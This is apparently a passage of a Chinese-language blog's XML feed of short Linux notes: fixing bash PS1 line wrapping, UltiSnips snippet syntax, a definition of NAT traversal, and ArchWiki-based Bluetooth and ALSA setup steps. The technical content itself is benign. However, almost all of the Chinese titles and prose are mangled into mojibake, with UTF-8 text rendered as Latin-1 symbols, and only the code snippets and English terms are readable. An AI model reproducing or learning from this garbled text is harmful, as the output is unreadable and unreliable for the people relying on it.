èŒƒå›´å†…çš„å­—ç¬¦.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ Linux è¾“å…¥é•¿å‘½ä»¤æ—¶ä¸ä¼šè‡ªåŠ¨æ¢è¡Œï¼Œåªä¼šå›åˆ°è¡Œè¡Œé¦–ï¼Œå¹¶ä¸”è¦†ç›–å‰é¢çš„å†…å®¹é—®é¢˜</title>
    <link href="/2022/09/07/%E8%A7%A3%E5%86%B3-Linux-%E8%BE%93%E5%85%A5%E9%95%BF%E5%91%BD%E4%BB%A4%E6%97%B6%E4%B8%8D%E4%BC%9A%E8%87%AA%E5%8A%A8%E6%8D%A2%E8%A1%8C%EF%BC%8C%E5%8F%AA%E4%BC%9A%E5%9B%9E%E5%88%B0%E8%A1%8C%E8%A1%8C%E9%A6%96%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%A6%86%E7%9B%96%E5%89%8D%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/07/%E8%A7%A3%E5%86%B3-Linux-%E8%BE%93%E5%85%A5%E9%95%BF%E5%91%BD%E4%BB%A4%E6%97%B6%E4%B8%8D%E4%BC%9A%E8%87%AA%E5%8A%A8%E6%8D%A2%E8%A1%8C%EF%BC%8C%E5%8F%AA%E4%BC%9A%E5%9B%9E%E5%88%B0%E8%A1%8C%E8%A1%8C%E9%A6%96%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%A6%86%E7%9B%96%E5%89%8D%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>æ¯”å¦‚æˆ‘ä¹‹å‰çš„ä¸º:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PS1</span>=&#x27;\<span class="hljs-number">033</span>[<span class="hljs-number">1</span>;<span class="hljs-number">95</span>m[\u@\h \W]\<span class="hljs-number">033</span>[<span class="hljs-number">0</span>m&#x27;<br></code></pre></td></tr></table></figure><p>å°±å‡ºç°äº†é—®é¢˜ã€‚</p><p>è§£å†³, å³æ·»åŠ  <code>\[\]</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PS1</span>=&#x27;\[\<span class="hljs-number">033</span>[<span class="hljs-number">1</span>;<span class="hljs-number">95</span>m[\u@\h \W]\<span class="hljs-number">033</span>[<span class="hljs-number">0</span>m\]&#x27;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº vim æ’ä»¶ ultisnips å¯¹ markdown æ–‡ä»¶æ— æ•ˆ</title>
    <link href="/2022/09/06/%E5%85%B3%E4%BA%8E-vim-%E6%8F%92%E4%BB%B6-ultisnips-%E5%AF%B9-markdown-%E6%96%87%E4%BB%B6%E6%97%A0%E6%95%88/"/>
    <url>/2022/09/06/%E5%85%B3%E4%BA%8E-vim-%E6%8F%92%E4%BB%B6-ultisnips-%E5%AF%B9-markdown-%E6%96%87%E4%BB%B6%E6%97%A0%E6%95%88/</url>
    
    <content type="html"><![CDATA[<p>æš‚æ—¶æ²¡æœ‰åŠæ³•.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>UltiSnips ä½¿ç”¨</title>
    <link href="/2022/09/06/UltiSnips-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/06/UltiSnips-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>æ–‡æ¡£èµ„æ–™åœ¨ <a href="https://github.com/SirVer/ultisnips.git">https://github.com/SirVer/ultisnips.git</a> è¿™ä¸ªä»“åº“çš„ <code>doc</code> ç›®å½•ä¸‹.<br>ä¹Ÿå¯åœ¨ <a href="https://sirver.net/">sirver çš„ä¸ªäººåšå®¢</a>æŸ¥çœ‹.<br>åœ¨ snippet æ—¶ï¼Œç”¨ <code>&quot;</code> æ¥æ³¨é‡Šã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>$1</code> ç­‰ç‰¹æ®Šå˜é‡æ¥æ ‡è¯†å…‰æ ‡çš„ä½ç½®:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">snippets</span> t <span class="hljs-string">&quot;A simple HTML text&quot;</span><br>&lt;<span class="hljs-variable">$1</span>&gt; <br>    Hello World<br>&lt;/<span class="hljs-variable">$1</span>&gt;<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¿™ä¸€æ®µï¼Œå½“ä½ å±•å¼€è¿™ä¸ª snippets çš„æ—¶å€™ï¼Œå…‰æ ‡ä½äº <code>$1</code> å¤„ï¼Œç„¶åä½ ç¼–è¾‘å†…å®¹æ—¶ï¼Œå¦ä¸€ä¸ª <code>$1</code> ä¹Ÿä¼šè¢«ç¼–è¾‘.</p><p>å¦ä¸€æ®µ, å¤šäº†ä¸€ä¸ª <code>&#123;&#125;</code>:      </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">snippets t <span class="hljs-string">&quot;A simple HTML text&quot;</span><br>&lt;<span class="hljs-variable">$&#123;</span><span class="hljs-number">1</span><span class="hljs-symbol">:div</span>&#125;&gt; <br>    <span class="hljs-title class_">Hello</span> <span class="hljs-title class_">World</span><br>&lt;/<span class="hljs-variable">$1</span>&gt;<br></code></pre></td></tr></table></figure><p>è¿™ä¼šä½¿å…‰æ ‡é€‰ä¸­è¿™ä¸ªæ–‡æœ¬ <code>div</code>.</p><p>ç¬¬ä¸‰ä¸ªä¾‹å­, åœ¨ <code>snippets</code> è¿™ä¸€è¡Œåé¢åŠ ä¸Šä¸€ä¸ª <code>b</code>, å³ begin, è¡¨ç¤ºåªæœ‰åœ¨è¡Œé¦–æ—¶åœ¨ç”¨ tab ç›´æ¥å±•å¼€:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">snippets t <span class="hljs-string">&quot;A simple HTML text&quot;</span> b<br>&lt;<span class="hljs-variable">$&#123;</span><span class="hljs-number">1</span><span class="hljs-symbol">:div</span>&#125;&gt; <br>    <span class="hljs-title class_">Hello</span> <span class="hljs-title class_">World</span><br>&lt;/<span class="hljs-variable">$1</span>&gt;<br></code></pre></td></tr></table></figure><p>ç¬¬å››ä¸ªä¾‹å­ï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„æ›¿æ¢åŠŸèƒ½:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">snippets t <span class="hljs-string">&quot;A simple HTML text&quot;</span> b<br>&lt;<span class="hljs-variable">$&#123;1:div&#125;</span>&gt; <br>    Hello World<br>&lt;<span class="hljs-regexp">/$&#123;1/</span>(\w+).*&#125;<span class="hljs-regexp">/$1/</span>&gt;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>&#123;</code> åé¢çš„ 1 ä»ç„¶æ˜¯å…‰æ ‡çš„ä½ç½®ï¼Œæœ€åä¸€æ’çš„ç¬¬äºŒä¸ª <code>$1</code> è¡¨ç¤ºåœ¨ç¬¬ä¸€å‡ºå…‰æ ‡å¤„è¢«é€‰ä¸­çš„æ–‡æœ¬ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„ <code>div</code>.</p><p>ä½¿ç”¨ `` åŒ…è£¹èµ·æ¥çš„éƒ¨åˆ†å¯ä»¥ç›´æ¥å†™è„šæœ¬ï¼Œå¦‚ Shell Script, Vimsript, Perl, Python. è¯­æ³•å¦‚ä¸‹:</p><ul><li>Shell : `echo hi` or `#! &#x2F;usr&#x2F;bin&#x2F;perl<br>                          print â€œHelloâ€`</li><li>Vimscript : `!v â€œ1 + 2â€ . string(1+2)`, ä¹Ÿå°±æ˜¯å‰é¢æœ‰ä¸€ä¸ª <code>!v</code></li><li>Python : `!p snip.rc &#x3D; â€œHelloâ€`, å‰é¢æœ‰ä¸ª <code>!p</code></li></ul><h2 id="Inword-triggers"><a href="#Inword-triggers" class="headerlink" title="Inword triggers"></a>Inword triggers</h2><p>åœ¨ snippet é‚£ä¸€è¡ŒåŠ ä¸Š <code>i</code>, è¡¨ç¤ºå°†ä¸€ä¸ªå•è¯æ‰©å±•å¼€:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">snippet</span> ri <span class="hljs-string">&quot;rizer&quot;</span> i<br>rizer<br>endsnippet<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ, ä½ è¾“å…¥ <code>ri</code> ç„¶å <code>tab</code> å°±ä¼šæ‰©å±•æˆ <code>rizer</code>.</p><h2 id="Regular-Expression-triggers"><a href="#Regular-Expression-triggers" class="headerlink" title="Regular Expression triggers"></a>Regular Expression triggers</h2><p>åœ¨ snippet é‚£ä¸€è¡ŒåŠ ä¸Š <code>rb</code> , ç”¨äºæ‰©å±•çš„å…³é”®è¯å¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥è¡¨ç¤º:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">snippet <span class="hljs-string">&quot;chap?t?e?r?&quot;</span> <span class="hljs-string">&quot;Latex chapter&quot;</span> rb<br>\section&#123;chapter&#125;    <br>    <span class="hljs-variable">$0</span><br>\<span class="hljs-keyword">end</span>&#123;chapter&#125;<br>endsnippet<br></code></pre></td></tr></table></figure><p><img src="/../img/ultisnippet_quick_check.png"></p><h1 id="Visual-æ–°ç‰¹æ€§çš„ä½¿ç”¨"><a href="#Visual-æ–°ç‰¹æ€§çš„ä½¿ç”¨" class="headerlink" title="Visual æ–°ç‰¹æ€§çš„ä½¿ç”¨"></a>Visual æ–°ç‰¹æ€§çš„ä½¿ç”¨</h1><p><code>$&#123;VISUAL&#125;</code> å°±æ˜¯è¿™ä¸ªå˜é‡, ä½¿ç”¨ä½ ç”¨äºæ‰©å±•çš„é”®, åœ¨ visual æ¨¡å¼ä¸‹å‰ªåˆ‡æ–‡æœ¬, ä¼šä¿å­˜åœ¨è¿™é‡Œ.</p><h1 id="å…³äºä½¿ç”¨-Python"><a href="#å…³äºä½¿ç”¨-Python" class="headerlink" title="å…³äºä½¿ç”¨ Python"></a>å…³äºä½¿ç”¨ Python</h1><p><code>snip.rv</code> çš„ä½œç”¨æ˜¯å°†è¿”å›å€¼æ›¿ä»£æ–‡æœ¬.</p><h1 id="å…³äº-global"><a href="#å…³äº-global" class="headerlink" title="å…³äº global"></a>å…³äº global</h1><p>ä½äº:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">global</span> <span class="hljs-keyword">TYPE</span><br>endglobal<br></code></pre></td></tr></table></figure><p>ä¹‹é—´çš„åº”ç”¨äºæ‰€æœ‰åé¢çš„ç±»å‹.</p><p>å¦‚:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">global</span> <span class="hljs-title">!p</span><br>endglobal<br></code></pre></td></tr></table></figure><p>è¿™å°±æ˜¯åº”ç”¨äº python.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯å†…ç½‘ç©¿é€</title>
    <link href="/2022/09/06/%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2022/09/06/%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<p>Intranet Penetration, å†…ç½‘ç©¿é€, ä¹Ÿå« NAT ç©¿é€ï¼Œå…¶ä½¿å…·æœ‰æŸä¸€ä¸ªç‰¹å®šæº IP åœ°å€å’Œæºç«¯å£å·çš„æ•°æ®åŒ…ä¸è¢« NAT è®¾å¤‡å±è”½è€Œæ­£ç¡®è·¯ç”±åˆ°å†…ç½‘ä¸»æœº.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux ç³»ç»Ÿä¸­å¸¸è§ç›®å½•åç§°åŠç›¸åº”å†…å®¹</title>
    <link href="/2022/09/06/Linux-%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9B%AE%E5%BD%95%E5%90%8D%E7%A7%B0%E5%8F%8A%E7%9B%B8%E5%BA%94%E5%86%85%E5%AE%B9/"/>
    <url>/2022/09/06/Linux-%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9B%AE%E5%BD%95%E5%90%8D%E7%A7%B0%E5%8F%8A%E7%9B%B8%E5%BA%94%E5%86%85%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/Linux%E7%9B%AE%E5%BD%95.png" alt="Linuxç›®å½•"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­å…³äº Bluetooth</title>
    <link href="/2022/09/06/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bluetooth/"/>
    <url>/2022/09/06/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bluetooth/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Bluetooth">ArchWiki ä¸­ç›¸å…³éƒ¨åˆ†</a><br>Bluetooth æ˜¯ä¸€ä¸ªçŸ­è·ç¦»æ— çº¿é€šä¿¡çš„æ ‡å‡†ï¼Œç”¨äºåœ¨æ‰‹æœºï¼Œè®¡ç®—æœºå’Œå…¶ä»–ç”µå­è®¾å¤‡ä¹‹é—´é€šä¿¡ã€‚</p><p>åœ¨ Linux ä¸­ï¼Œæƒå¨çš„è“ç‰™åè®®æ ˆå®ç°æ˜¯ BlueZ</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><ul><li>bluez, æä¾›è“ç‰™åè®®æ ˆ</li><li>bluez-utils, æä¾›  <code>bluetoothctl</code> å®ç”¨ç¨‹åº</li><li>btusb å†…æ ¸æ¨¡å—ï¼Œæ˜¯é€šç”¨çš„è“ç‰™é©±åŠ¨ï¼Œéœ€è¦æ£€æŸ¥å…¶æ˜¯å¦åŠ è½½</li><li>å¯ç”¨ <code>bulutooth.service</code></li></ul><p>è“ç‰™å®ˆæŠ¤è¿›ç¨‹é»˜è®¤åªä¼šå‘å±äº <code>lp</code> ç»„çš„ç”¨æˆ·æš´éœ² <code>bnep0</code> è®¾å¤‡ï¼Œå¦‚æœè¦è¿æ¥åˆ°è“ç‰™è®¾å¤‡ï¼Œå…ˆå°†ç”¨æˆ·æ·»åŠ åˆ°è¿™ä¸ªç»„ï¼Œå¯ä»¥åœ¨ <code>/usr/share/dbus-1/system.d/bluetooth.conf</code> ä¸­ä¿®æ”¹ã€‚</p><p>ä¸€äº›è“ç‰™é€‚é…å™¨å’Œæ— çº¿ç½‘å¡ç»‘å®šï¼Œè¿™äº›è“ç‰™é€‚é…å™¨éœ€è¦å…ˆå¯ç”¨æ— çº¿ç½‘å¡æ‰èƒ½è¢«å†…æ ¸è¯†åˆ«ã€‚</p><h1 id="é…å¯¹"><a href="#é…å¯¹" class="headerlink" title="é…å¯¹"></a>é…å¯¹</h1><p>åœ¨ä½¿ç”¨è“ç‰™è®¾å¤‡ä¹‹å‰å…ˆæ£€æŸ¥å…¶æœ‰æ²¡æœ‰è¢« rfkill ç¦ç”¨ã€‚</p><p>ä¸€èˆ¬æ­¥éª¤ï¼š<br>å…ˆè¿è¡Œ <code>bluetoothctl</code> è¿›å…¥äº¤äº’ç•Œé¢:</p><ol><li>(å¯é€‰æ“ä½œ) <code>select MAC_address</code>, é€‰æ‹©ä¸€ä¸ªé»˜è®¤çš„è“ç‰™æ¥æ”¶å™¨</li><li><code>power on</code>, æ‰“å¼€è“ç‰™ï¼Œé»˜è®¤ä¸ºå…³é—­</li><li><code>devices</code>, è·å¾—è¦é…å¯¹çš„è®¾å¤‡çš„ MAC åœ°å€</li><li><code>scan on</code>, æœç´¢å‘ç°æ‰€æœ‰å¯é…å¯¹çš„è®¾å¤‡</li><li><code>agent on</code>, æ‰“å¼€ä»£ç†æˆ–è€…é€‰æ‹©ä¸€ä¸ªç‰¹å®šçš„ä»£ç†</li><li><code>pair MAC_address</code>, é…å¯¹è®¾å¤‡</li><li><code>trust MAC_address</code>, æ·»åŠ åˆ°ä¿¡ä»»åˆ—è¡¨</li><li><code>connect MAC_address</code>, å»ºç«‹é“¾æ¥</li></ol><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p>å¼€æœºåè‡ªå¯åŠ¨ç­‰ï¼Œè§ ArchWiki</p><h2 id="å¼€æœºå¯åŠ¨"><a href="#å¼€æœºå¯åŠ¨" class="headerlink" title="å¼€æœºå¯åŠ¨"></a>å¼€æœºå¯åŠ¨</h2><p>åœ¨ <code>/etc/bluetooth/main.conf</code> ä¸­æ·»åŠ :</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Policy]</span><br><span class="hljs-attr">AutoEnable</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="å¯åŠ¨åè‡ªåŠ¨å¯è¢«å‘ç°"><a href="#å¯åŠ¨åè‡ªåŠ¨å¯è¢«å‘ç°" class="headerlink" title="å¯åŠ¨åè‡ªåŠ¨å¯è¢«å‘ç°"></a>å¯åŠ¨åè‡ªåŠ¨å¯è¢«å‘ç°</h2><p>åœ¨ <code>/etc/bluetooth/main.conf</code> ä¸­æ·»åŠ :</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[General]</span><br><span class="hljs-attr">DiscoverableTimeout</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="è¿æ¥è“ç‰™è€³æœº"><a href="#è¿æ¥è“ç‰™è€³æœº" class="headerlink" title="è¿æ¥è“ç‰™è€³æœº"></a>è¿æ¥è“ç‰™è€³æœº</h1><p>éœ€è¦å…ˆå®‰è£… <code>pulseaudio-bluetooth</code></p><p>æœ‰æ—¶å€™è¦ç”¨ <code>pavucontrol</code> é€‰æ‹©éŸ³é¢‘çš„è¾“å‡ºè®¾å¤‡.</p><p>ç¡®è®¤é‡æ–°å¯åŠ¨ pulseaudio æ¥ä½¿å¾—å®‰è£…ç”Ÿæ•ˆ:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>pulseaudio -k<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­å…³äº ALSA</title>
    <link href="/2022/09/06/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-ALSA/"/>
    <url>/2022/09/06/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-ALSA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Advanced_Linux_Sound_Architecture">ArchWiki ç›¸å…³é¡µé¢</a><br>ALSA æ˜¯ Advanced Linux Sound Architecture çš„ç®€ç§°ï¼Œå…¶æä¾›å£°å¡çš„å†…æ ¸é©±åŠ¨ã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>ALSA æ˜¯ä¸€ç»„å†…ç½®çš„ Linux å†…æ ¸æ¨¡å—ï¼Œæ— éœ€æ‰‹åŠ¨å®‰è£…ã€‚</p><p>udev ä¼šåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨æ£€æµ‹ç¡¬ä»¶å¹¶é€‰æ‹©æ‰€éœ€çš„é©±åŠ¨ï¼Œå¹¶åŠ è½½ç›¸åº”çš„å£°éŸ³è®¾å¤‡é©±åŠ¨æ¨¡å—ã€‚</p><h2 id="ç”¨æˆ·æƒé™"><a href="#ç”¨æˆ·æƒé™" class="headerlink" title="ç”¨æˆ·æƒé™"></a>ç”¨æˆ·æƒé™</h2><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæœ¬åœ°ç”¨æˆ·æœ‰æƒæ’­æ”¾éŸ³é¢‘å’Œæ”¹å˜æ··éŸ³å™¨éŸ³é‡ã€‚</p><p>è¦è®©è¿œç¨‹ç”¨æˆ·æ‹¥æœ‰è¿™äº›æƒé™ï¼Œéœ€è¦æŠŠè¿™äº›ç”¨æˆ·åŠ å…¥ <code>audio</code> ç”¨æˆ·ç»„ã€‚</p><p><code>audio</code> ç”¨æˆ·ç»„å…è®¸ç”¨æˆ·ç›´æ¥è®¿é—®è®¾å¤‡ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸å»ºè®®æŠŠç”¨æˆ·åŠ å…¥ <code>audio</code> ç”¨æˆ·ç»„.</p><h2 id="ALSA-å®ç”¨ç¨‹åº"><a href="#ALSA-å®ç”¨ç¨‹åº" class="headerlink" title="ALSA å®ç”¨ç¨‹åº"></a>ALSA å®ç”¨ç¨‹åº</h2><p>å®‰è£…è½¯ä»¶åŒ… <code>alsa-utils</code> å…¶åŒ…å« <code>alsamixer</code>, <code>amixer</code> ç­‰:</p><ul><li><code>amixer</code>, shell å‘½ä»¤</li><li><code>alsamixer</code>, åŸºäº ncurses çš„ç•Œé¢</li></ul><h1 id="è§£é™¤å„å£°é“çš„é™éŸ³"><a href="#è§£é™¤å„å£°é“çš„é™éŸ³" class="headerlink" title="è§£é™¤å„å£°é“çš„é™éŸ³"></a>è§£é™¤å„å£°é“çš„é™éŸ³</h1><p>ALSA é»˜è®¤é™éŸ³æ‰€æœ‰å£°é“ï¼Œéœ€è¦æ‰‹åŠ¨è§£é™¤.</p><h2 id="ä½¿ç”¨-amixer"><a href="#ä½¿ç”¨-amixer" class="headerlink" title="ä½¿ç”¨ amixer"></a>ä½¿ç”¨ amixer</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ amixer sset <span class="hljs-keyword">Master</span> <span class="hljs-title">unmute</span><br>$ amixer sset Speaker unmute<br>$ amixer sset Headphone unmute<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-alsamixer"><a href="#ä½¿ç”¨-alsamixer" class="headerlink" title="ä½¿ç”¨ alsamixer"></a>ä½¿ç”¨ alsamixer</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>alsamixer<br></code></pre></td></tr></table></figure><p>ç„¶åä¸Šä¸‹å·¦å³é”®ä½.</p><h2 id="å¯ç”¨éº¦å…‹é£"><a href="#å¯ç”¨éº¦å…‹é£" class="headerlink" title="å¯ç”¨éº¦å…‹é£"></a>å¯ç”¨éº¦å…‹é£</h2><p>æŒ‰ <code>F4</code> åˆ‡æ¢è‡³ <code>Capture</code> é€‰é¡¹å¡ï¼Œç„¶åæŒ‰ç©ºæ ¼å¯ç”¨ä¸€ä¸ªå£°é“.</p><h2 id="æµ‹è¯•æ›´æ”¹"><a href="#æµ‹è¯•æ›´æ”¹" class="headerlink" title="æµ‹è¯•æ›´æ”¹"></a>æµ‹è¯•æ›´æ”¹</h2><p>æµ‹è¯•å£°å¡æ˜¯å¦å·¥ä½œ:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ speaker-<span class="hljs-keyword">test</span> -c <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>éœ€æ ¹æ®æ‰¬å£°å™¨çš„é…ç½®ï¼Œè°ƒæ•´ <code>-c</code>.</p><p>è‹¥ç³»ç»Ÿæœ‰å¤šä¸ªå£°å¡ï¼Œå¯ä»¥ç”¨ <code>F6</code> åˆ‡æ¢.</p><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p>ç³»ç»Ÿé…ç½®æ–‡ä»¶æ˜¯ <code>/etc/asound.conf</code>, åˆ†ç”¨æˆ·é…ç½®æ–‡ä»¶æ˜¯ <code>~/.asoundrc</code>.</p><p>åŸºæœ¬è¯­æ³•è§ ArchWiki.</p><h1 id="æŠ€å·§"><a href="#æŠ€å·§" class="headerlink" title="æŠ€å·§"></a>æŠ€å·§</h1><h2 id="ç¦æ­¢å¯åŠ¨æ—¶è‡ªåŠ¨é™éŸ³"><a href="#ç¦æ­¢å¯åŠ¨æ—¶è‡ªåŠ¨é™éŸ³" class="headerlink" title="ç¦æ­¢å¯åŠ¨æ—¶è‡ªåŠ¨é™éŸ³"></a>ç¦æ­¢å¯åŠ¨æ—¶è‡ªåŠ¨é™éŸ³</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta"># amixer -c 0 sset <span class="hljs-string">&quot;Auto-Mute Mode&quot;</span> Disabled</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>alsamixerl</code> å›¾å½¢ç•Œé¢æ—¶:</p><ul><li><code>alsactl store</code> ä¿å­˜æ›´æ”¹</li><li><code>alsactl daemon</code> ä¿å­˜æ›´æ”¹</li></ul><h2 id="é”®ç›˜æ§åˆ¶éŸ³é‡"><a href="#é”®ç›˜æ§åˆ¶éŸ³é‡" class="headerlink" title="é”®ç›˜æ§åˆ¶éŸ³é‡"></a>é”®ç›˜æ§åˆ¶éŸ³é‡</h2><p>å°†ä¸‹é¢å‘½ä»¤æ˜ å°„åˆ°ä½ çš„éŸ³é‡é”®: <code>XF86AudioRaiseVolume</code>, <code>XF86AudioLowerVolume</code>, <code>XF86AudioMute</code>:<br>å¢åŠ éŸ³é‡:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">amixer set <span class="hljs-keyword">Master</span> <span class="hljs-title">5</span>%+<br></code></pre></td></tr></table></figure><p>å‡å°éŸ³é‡:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">amixer set <span class="hljs-keyword">Master</span> <span class="hljs-title">5</span>%-<br></code></pre></td></tr></table></figure><p>é™éŸ³&#x2F;è§£é™¤é™éŸ³:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">amixer set <span class="hljs-keyword">Master</span> <span class="hljs-title">toggle</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº Shell å­—ä½“ç¾åŒ–</title>
    <link href="/2022/09/06/%E5%85%B3%E4%BA%8E-Shell-%E5%AD%97%E4%BD%93%E7%BE%8E%E5%8C%96/"/>
    <url>/2022/09/06/%E5%85%B3%E4%BA%8E-Shell-%E5%AD%97%E4%BD%93%E7%BE%8E%E5%8C%96/</url>
    
